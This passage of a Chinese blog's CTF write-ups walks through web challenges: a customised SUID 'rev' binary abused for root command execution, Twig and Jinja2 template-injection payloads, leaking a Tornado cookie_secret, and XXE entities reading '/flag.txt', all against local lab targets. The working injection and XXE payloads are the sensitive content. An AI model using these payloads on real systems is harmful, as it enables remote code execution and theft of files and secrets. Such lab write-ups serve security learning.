遍历命令行参数（从第1个参数开始，跳过程序名argv[0]）</span><br><span class="line">    for (int i = 1; i + 1 &lt; argc; i++) &#123;</span><br><span class="line">        // 判断当前参数是否是定制的--HDdss</span><br><span class="line">        if (strcmp(&quot;--HDdss&quot;, argv[i]) == 0) &#123;</span><br><span class="line">            // 执行--HDdss后面的命令（核心：放弃反转字符串，执行外部命令）</span><br><span class="line">            execvp(argv[i + 1], &amp;argv[i + 1]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>execvp</code> 是 Linux&#x2F;Unix 系统下 C 语言的<strong>进程替换函数</strong></p><p>大白话讲：它的作用是「用一个新的命令 &#x2F; 程序，替换当前正在运行的程序进程（rev）</p></li><li><p>拿 flag</p><p>用内存马执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rev --HDdss cat /flag</span><br></pre></td></tr></table></figure></li></ol><ul><li><code>rev</code>以 root 权限运行（因为 SUID 位）；</li><li><code>--HDdss</code>是 rev 的特殊参数，让它执行后面的<code>cat /flag</code>（相当于用 root 权限读 &#x2F;flag）；</li><li><code>rev</code>本身是 “反转字符串” 的命令，但这里是题目定制的版本，加参数后能执行其他命令。</li></ul><p>5.rev反转字符串</p><p>普通用法下（比如<code>rev test.txt</code>），它还是会反转字符串；但只要加了<code>--HDdss</code>这个出题人自定义的参数，代码里的逻辑就会 “走岔路”—— 跳过反转字符串的代码块，执行 “执行外部命令” 的代码块。</p><p>1.构造内存马</p><p>2.注入内存马</p><p>3.传参a&#x3D;ls &#x2F;和whoami</p><p>输入：<a href="http://127.0.0.1:10745/?a=ls%20/&password=1">http://127.0.0.1:10745/?a=ls%20/&amp;password=1</a></p><p>得到：flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app bin boot dev entrypoint.sh etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var </span><br></pre></td></tr></table></figure><p><img src="/images/image-20251224203920593.png" alt="image-20251224203920593"></p><p>为什么不传cat &#x2F;flag？因为whoami之后会发现你不是root，需要提权才能cat &#x2F;flag</p><p>4.找到能提权的指令，然后后面跟特殊定制版命令，最后加上cat &#x2F;flag</p><p>4.1找到rev</p><p>4.2rev.c查看源代码，发现有定制版rev</p><p>4.3输入：</p><p><a href="http://127.0.0.1:10745/?a=rev">http://127.0.0.1:10745/?a=rev</a> –HDdss cat &#x2F;flag&amp;password&#x3D;1</p><p><img src="/images/image-20251224203954397.png" alt="image-20251224203954397"></p><p><img src="/images/image-20251224204057314.png" alt="image-20251224204057314"></p><p>第一道由我自己找到思路的题目！！！！！！！！！</p><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><h3 id="1-第一道由我自己找到思路的题目！！！！！！！！！结果发现思路不是很好。。。。"><a href="#1-第一道由我自己找到思路的题目！！！！！！！！！结果发现思路不是很好。。。。" class="headerlink" title="1 第一道由我自己找到思路的题目！！！！！！！！！结果发现思路不是很好。。。。"></a>1 第一道由我自己找到思路的题目！！！！！！！！！结果发现思路不是很好。。。。</h3><p>1.很正常的网站，进去之后后看了flag.php index.php的源码，并没有任何发现</p><p>唯一有的就是一个登陆页面，没有密码，只要输账号，然后我试了sql和万能密码，都没有用</p><p>于是想到每次输进去都会有显示：hello，xxx</p><p>好吧，我瞎了，看了题解发现</p><p><img src="/images/image-20251227115027878.png" alt="image-20251227115027878"></p><p>2.考虑ssti，输入{{7*7}}</p><p>发现惊喜！！！！！！！！</p><p><img src="/images/image-20251227135455493.png" alt="image-20251227135455493"></p><ol start="3"><li></li></ol><p>输入{{ lipsum.<strong>globals</strong>[‘os’].popen(‘env’).read() }}发现没有显示了，想到可能被过滤掉了</p><p>于是一个一个试，轮到{{ lipsum.}}发现显示为：</p><h2 id="What-do-you-want-to-do"><a href="#What-do-you-want-to-do" class="headerlink" title="What do you want to do?!"></a>What do you want to do?!</h2><p>试了好几个，都是这样，发现都被过滤，换种思路？cookie？</p><p>4.cookie，题目有提示的</p><p>抓个包看看</p><p>![屏幕截图 2025-12-27 135344](&#x2F;images&#x2F;屏幕截图 2025-12-27 135344.png)</p><p><strong>Cookie</strong>: <strong>PHPSESSID</strong>&#x3D;<strong>380b3509ce71b831ed6a431a408cb503</strong>; <strong>user</strong>&#x3D;<strong>1</strong></p><p>谢天谢地，原来注入点在这里呜呜呜呜</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>打开就是源码</p><figure class="highlight plaintext"><figcaption><span>flask</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import flask</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"># [疑点 1: Flag 在哪？]</span><br><span class="line"># 从系统环境变量拿走 FLAG 存入 app 的 config 字典里。</span><br><span class="line"># 以后只能通过 app.config[&#x27;FLAG&#x27;] 访问，系统里已经没这个环境变量了。</span><br><span class="line">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    # [疑点 2: 首页显示什么？]</span><br><span class="line">    # __file__ 指向当前这个 py 文件。访问首页就读取并显示这段源码。</span><br><span class="line">    # 所以你才能在网页上看到这些代码。</span><br><span class="line">    return open(__file__).read()</span><br><span class="line"></span><br><span class="line"># [疑点 3: 路由和变量怎么来的？]</span><br><span class="line"># &lt;path:shrine&gt; 就像个捕获器，URL 后面跟着什么，变量 shrine 就是什么。</span><br><span class="line">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)</span><br><span class="line">def shrine(shrine):</span><br><span class="line"></span><br><span class="line">    def safe_jinja(s):</span><br><span class="line">        # [疑点 4: 为什么要删括号？]</span><br><span class="line">        # 把 () 删掉是为了防止你通过 Python 语法调用函数，比如 .read()</span><br><span class="line">        s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)</span><br><span class="line">        </span><br><span class="line">        # [疑点 5: config 和 self 哪里来的？]</span><br><span class="line">        # 这是程序员手动定义的“黑名单”列表，里面存了两个他想封杀的词。</span><br><span class="line">        blacklist = [&#x27;config&#x27;, &#x27;self&#x27;]</span><br><span class="line">        </span><br><span class="line">        # [疑点 6: 拼接是怎么实现的？]</span><br><span class="line">        # 这一行其实是：</span><br><span class="line">        # 1. 循环 blacklist 里的词。</span><br><span class="line">        # 2. 生成 &quot;&#123;&#123;% set config=None%&#125;&#125;&#123;&#123;% set self=None%&#125;&#125;&quot; 这样两句禁令。</span><br><span class="line">        # 3. 最后加上你输入的字符串 s (即参数 shrine)。</span><br><span class="line">        prefix = &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist])</span><br><span class="line">        return prefix + s</span><br><span class="line"></span><br><span class="line">    # [疑点 7: 为什么能执行代码？]</span><br><span class="line">    # render_template_string 是核心，它会把字符串当成 Jinja2 模板执行。</span><br><span class="line">    # 它收到的内容是：[禁令] + [你输入的内容]。</span><br><span class="line">    # 因为禁令在前，如果你直接写 &#123;&#123;config&#125;&#125;，只会得到 None。</span><br><span class="line">    return flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import flask</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"># [核心目标]：Flag 被存放在了 app 的 config 里面</span><br><span class="line">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//os.environ：这是一个字典，里面存着你电脑/服务器上所有的“环境变量”（比如系统用户名、路径等）。</span><br><span class="line"></span><br><span class="line">//pop(&#x27;FLAG&#x27;)：这是字典的一个操作。它的意思是：把名字叫 FLAG 的那个值拿出来，并从环境变量里彻底删掉。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//@app.route(&#x27;/&#x27;) 是什么意思？</span><br><span class="line"></span><br><span class="line">    //在 Flask 里，这叫“路由装饰器”。</span><br><span class="line"></span><br><span class="line">    //它告诉服务器：“如果有用户访问网站的‘根目录’（即网站首页，/），就请执行下面那个名为 index() 的函数。”</span><br><span class="line"></span><br><span class="line">    //所以当你打开浏览器输入 http://127.0.0.1:5000/，你看到的内容就是 index() 函数返回的东西。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def index():</span><br><span class="line">//这是的函数就是上面路由需要执行的函数了</span><br><span class="line"></span><br><span class="line">    # 访问根目录时，直接把这段代码读出来显示在网页上</span><br><span class="line">    return open(__file__).read()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)  //有人输入这个url就会执行下面的函数</span><br><span class="line"></span><br><span class="line">&lt;path:shrine&gt;：这是一个捕获器。它告诉 Flask，门牌号 /shrine/ 后面跟着的任何东西，都把它装进一个叫 shrine 的信封里，交给下面的函数处理。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def shrine(shrine):</span><br><span class="line">    def safe_jinja(s):</span><br><span class="line">        # [限制 1]：把括号 ( ) 替换为空，这意味着你不能调用任何函数（如 .read()）</span><br><span class="line">        s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)</span><br><span class="line">        </span><br><span class="line">        # [限制 2]：黑名单，不准直接使用 config 和 self 这两个变量名</span><br><span class="line">        blacklist = [&#x27;config&#x27;, &#x27;self&#x27;]</span><br><span class="line">        </span><br><span class="line">        # [混淆操作]：在你的 Payload 前面强行加上 &#123;&#123;% set config=None %&#125;&#125;</span><br><span class="line">        # 这会导致你在模板里直接写 &#123;&#123; config &#125;&#125; 拿不到任何东西</span><br><span class="line">        prefix = &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None %&#125;&#125;&#x27;.format(c) for c in blacklist])</span><br><span class="line">        </span><br><span class="line">        //1.&#x27; ... &#123;&#125; ... &#x27;.format(&#x27;config&#x27;) ：</span><br><span class="line">        Python 只盯着那一对孤零零的大括号 &#123;&#125;。它看到 .format(&#x27;config&#x27;)，就立刻把 &#x27;config&#x27; 塞进那个坑里。</span><br><span class="line">        //2.&#x27;&#x27;.join([...])里面的&#x27;&#x27;是啥意思：</span><br><span class="line">&#x27;&#x27;.join([&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;])&quot;ABC&quot;就像用无形胶水粘在一起</span><br><span class="line">&#x27;-&#x27;.join([&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;])&quot;A-B-C&quot;用横杠作为粘合剂</span><br><span class="line">&#x27; 和 &#x27;.join([&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;])&quot;A 和 B 和 C&quot;用文字作为粘合剂</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        return prefix + s</span><br><span class="line">        //进行拼接</span><br><span class="line"></span><br><span class="line">    # [漏洞点]：render_template_string 会解析并执行用户传入的字符串</span><br><span class="line">    return flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure><h3 id="为什么-current-app-config-还能用？"><a href="#为什么-current-app-config-还能用？" class="headerlink" title="为什么 current_app.config 还能用？"></a>为什么 <code>current_app.config</code> 还能用？</h3><p>在编程中，<code>config</code> 这个词出现在不同的地方，意义完全不同：</p><ul><li><p><strong>作为独立变量名：</strong> <code>{{ config }}</code> —— 这个被你代码里的 <code>set config=None</code> 废掉了。</p></li><li><p><strong>作为对象的属性：</strong> <code>current_app.config</code> —— 这里的 <code>config</code> 是 <code>current_app</code> 这个对象内部的一个<strong>属性（Key）</strong>。</p></li><li><p>当你访问 <code>current_app.config</code> 时：</p><ol><li>模板引擎先找到了 <code>current_app</code> 这个对象（它不在黑名单里）。</li><li>然后去读取这个对象内部的 <code>config</code> 属性。</li><li>这个属性指向的是内存中真实的配置字典，它<strong>没有</strong>被改成 <code>None</code>。</li></ol></li></ul><p>1.构造payload</p><p>需要通过一个“绕路”的 Payload 来找回被设为 None 的 <code>config</code>（里面有flag）</p><p><strong>推荐 Payload：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123; url_for.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;] &#125;&#125;</span><br></pre></td></tr></table></figure><p><code>url_for</code>：这是一个 Flask 自带的函数，代码没禁用它。</p><p><code>.__globals__</code>：获取这个函数运行时的全局环境。</p><p><code>[&#39;current_app&#39;]</code>：在全局环境里找到当前正在运行的这个 <code>app</code> 对象。</p><p><code>.config[&#39;FLAG&#39;]</code>：既然找到了 <code>app</code>，自然就能点出它的 <code>config</code>，从而拿到 Flag。</p><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><p>一进去三个连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt</span><br><span class="line">/welcome.txt</span><br><span class="line">/hints.txt</span><br></pre></td></tr></table></figure><p><strong>第一步：观察</strong></p><p>点击获得：</p><ol><li></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/welcome.txt&lt;br&gt;render</span><br></pre></td></tr></table></figure><p>说明这里是一个ssti注入模板。</p><p>在 Python 的 Web 开发（特别是 Tornado、Flask、Django）中，<code>render</code> 系列函数的功能是：<strong>将代码逻辑和 HTML 模板“缝合”在一起。</strong></p><ul><li><strong>正常用法：</strong> 程序员写死模板，只让你填数据（如用户名）。</li><li><strong>漏洞用法：</strong> 程序员把<strong>你输入的内容</strong>直接丢进 <code>render</code> 函数里处理。</li></ul><p>由于 <code>render</code> 具有<strong>执行指令</strong>的能力，如果你输入了 <code>{{ ... }}</code> 格式的内容，<code>render</code> 就会把它当成代码去执行，而不是当成普通的文字显示。</p><ol start="2"><li></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/hints.txt&lt;br&gt;md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure><p>处理逻辑：把文件名md5和cookie拼接起来，然后再整体md5</p><ol start="3"><li></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt&lt;br&gt;flag in /fllllllllllllag</span><br></pre></td></tr></table></figure><p>找到文件名</p><p>md5(cookie_secret+md5(3bf9f6cf685a6dd8defadabfb41a03a1))</p><p>还差cookie</p><p>4.还得到了三个url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /file?filename=/welcome.txt&amp;filehash=1b63a9ae097b47187135a844d4eafcfd</span><br><span class="line">GET /file?filename=/flag.txt&amp;filehash=a52b1928deff4c626d099883429dbcb4</span><br><span class="line">GET /file?filename=/hints.txt&amp;filehash=637657bcdc2a447924cb73ee504343f2</span><br></pre></td></tr></table></figure><p>那么我们发现：</p><p>第一，是小写32位哈希；</p><p>第二，MAC（Message Authentication Code，消息认证码）：所有我们传入的文件名都会和cookie一起md5解析，若被服务器验证正确，你就可以读取想要的文件。</p><p><strong>第二步：找cookie</strong></p><p>抓包并没有发现cookie，但是我们可以通过报错得到一些信息，或许信息里面就有cookie ？</p><p>知识点：Tornado 框架的特性 (The Key)</p><p>每一个 Web 框架在处理模板时，都会默认提供一些<strong>内置对象</strong>。</p><ul><li><p>在 <strong>Tornado</strong> 框架中，模板引擎可以直接访问一个叫 <code>handler</code> 的对象。</p></li><li><p><strong><code>handler</code> 对象：</strong> </p><p>它代表了当前处理请求的实例，它能够访问到整个 <code>application</code> 的设置。（所有的配置信息cookie_secret<code>都存储在 </code>self.<code>application</code>.settings里面。）</p><p>访问方式：可以通过 <code>handler.settings</code> 访问</p></li></ul><p>这里的逻辑是：</p><p>先找到一个可以注入的入口，然后放进去 handler.setting ，通过回显拿到cookie</p><p>怎么找入口（也就是可以打印和处理你输入的页面）？：</p><p><strong>利用“报错重定向”发现入口</strong></p><ul><li><strong>在主页乱传参：</strong> 无效。因为主页的后端代码（Handler）没写读取参数的功能</li><li><strong>在 <code>/file</code> 传参：</strong> 有效。这里的后端代码<strong>必须</strong>处理 <code>filename</code>。当你传一个不存在的 <code>aaa</code> 或错误的 <code>hash</code> 时，代码运行出错，触发了“异常处理”。</li><li><strong>发现重定向：</strong> 服务器自动把你踢到了 <code>/error?msg=Error</code>。这说明 <code>/error</code> 页面专门负责显示错误信息。</li></ul><p>利用报错重定向回显：如果你乱传参的话，他就没办法处理你的输入，那么就会把东西都扔到一个专门处理错误的地方。</p><p>通过&#x2F;file?filename&#x3D;传入aaa，可以得到处理错误的地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/error?msg=Error</span><br></pre></td></tr></table></figure><p>那么就得到了这个入口，进去之后的msg就是注入点</p><p><img src="/images/image-20260118094751344.png" alt="image-20260118094751344"></p><p>我们试试其他：</p><p><img src="/images/image-20260118094913939.png" alt="image-20260118094913939"></p><p><img src="/images/image-20260118094946270.png" alt="image-20260118094946270"></p><p>说明有过滤</p><p>但是没关系，试试看handler.settings</p><p><img src="/images/image-20260118095107239.png" alt="image-20260118095107239"></p><p>得到cookie！</p><p>0ba70d95-2474-4ced-b2e4-52d8473aca2a</p><p>按照之前的处理逻辑拼接加编码即可：</p><p>md5(cookie_secret+md5(3bf9f6cf685a6dd8defadabfb41a03a1))</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d6c816597dd95fed7b3e9e6b1a5976ad</span><br><span class="line"></span><br><span class="line">url：</span><br><span class="line">/file?filename=/fllllllllllllag&amp;filehash=d6c816597dd95fed7b3e9e6b1a5976ad</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf题解 </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssti注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-xml</title>
      <link href="/posts/9385fd8d.html"/>
      <url>/posts/9385fd8d.html</url>
      
        <content type="html"><![CDATA[<h2 id="web-xml"><a href="#web-xml" class="headerlink" title="web-xml"></a>web-xml</h2><p><img src="/images/image-20251226212439507.png" alt="image-20251226212439507"></p><ul><li>DOCTYPE（文档类型定义的声明）</li><li>ENTITY（实体的声明）</li><li>SYSTEM、PUBLIC（外部资源申请）</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">内部实体</span><br><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="string">&quot;实体值&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">外部实体</span><br><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="keyword">SYSTEM</span> <span class="string">&quot;URL&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="10-第十章-天机符阵-revenge"><a href="#10-第十章-天机符阵-revenge" class="headerlink" title="10 第十章 天机符阵_revenge"></a>10 第十章 天机符阵_revenge</h2><p>随便输入，得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Warning&lt;/b&gt;:  DOMDocument::loadXML(): Start tag expected, &#x27;&amp;lt;&#x27; not found in Entity, line: 1 in &lt;b&gt;/var/www/html/chapter10.php&lt;/b&gt; on line &lt;b&gt;17&lt;/b&gt;&lt;br /&gt;</span><br><span class="line">&lt;阵枢&gt;引魂玉&lt;/阵枢&gt;</span><br><span class="line">&lt;解析&gt;未定义&lt;/解析&gt;</span><br><span class="line">&lt;输出&gt;未定义&lt;/输出&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 输出 [</span><br><span class="line">&lt;!ENTITY flag SYSTEM &quot;file:///flag.txt&quot;&gt;]&gt;</span><br><span class="line">&lt;输出&gt;&amp;flag;&lt;/输出&gt; </span><br></pre></td></tr></table></figure><p>这里的路径和之前的题目不一样，虽然提示在&#x2F;var&#x2F;www&#x2F;html&#x2F;chapter10.php</p><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>1.查看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">function doLogin()&#123;</span><br><span class="line">var username = $(&quot;#username&quot;).val();</span><br><span class="line">var password = $(&quot;#password&quot;).val();</span><br><span class="line">if(username == &quot;&quot; || password == &quot;&quot;)&#123;</span><br><span class="line">alert(&quot;Please enter the username and password!&quot;);</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; </span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: &quot;POST&quot;,</span><br><span class="line">        url: &quot;doLogin.php&quot;,</span><br><span class="line">        contentType: &quot;application/xml;charset=utf-8&quot;,</span><br><span class="line">        data: data,</span><br><span class="line">        dataType: &quot;xml&quot;,</span><br><span class="line">        anysc: false,</span><br><span class="line">        success: function (result) &#123;</span><br><span class="line">        var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue;</span><br><span class="line">        var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue;</span><br><span class="line">        if(code == &quot;0&quot;)&#123;</span><br><span class="line">        $(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;);</span><br><span class="line">        &#125;else if(code == &quot;1&quot;)&#123;</span><br><span class="line">        $(&quot;.msg&quot;).text(msg + &quot; login success!&quot;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">        $(&quot;.msg&quot;).text(&quot;error:&quot; + msg);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function (XMLHttpRequest,textStatus,errorThrown) &#123;</span><br><span class="line">            $(&quot;.msg&quot;).text(errorThrown + &#x27;:&#x27; + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码：其中看到了xml格式</p><p>var data &#x3D; “<user><username>“ + username + “</username><password>“ + password + “</password></user>“; </p><p>还有doLogin.php</p><p>2.打开doLogin.php</p><p>看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Warning&lt;/b&gt;:  DOMDocument::loadXML(): Empty string supplied as input in &lt;b&gt;/var/www/html/doLogin.php&lt;/b&gt; on line &lt;b&gt;16&lt;/b&gt;&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Warning&lt;/b&gt;:  simplexml_import_dom(): Invalid Nodetype to import in &lt;b&gt;/var/www/html/doLogin.php&lt;/b&gt; on line &lt;b&gt;17&lt;/b&gt;&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Warning&lt;/b&gt;:  Cannot modify header information - headers already sent by (output started at /var/www/html/doLogin.php:16) in &lt;b&gt;/var/www/html/doLogin.php&lt;/b&gt; on line &lt;b&gt;31&lt;/b&gt;&lt;br /&gt;</span><br><span class="line">&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;&lt;/msg&gt;&lt;/result&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>报错内容</th><th>人话含义</th><th>对解题的关键提示</th></tr></thead><tbody><tr><td><code>Empty string supplied as input</code></td><td>核心问题：XML 解析器（DOMDocument）接收到的输入是<strong>空字符串</strong>（什么都没传）</td><td>你提交的参数为空 &#x2F; 提交方式错误，导致服务器没收到 XML 内容</td></tr><tr><td><code>simplexml_import_dom(): Invalid Nodetype to import</code></td><td>连锁问题：因为输入为空，解析出的 DOM 节点无效，无法转成 SimpleXML 对象</td><td>不是 XML 格式错，是 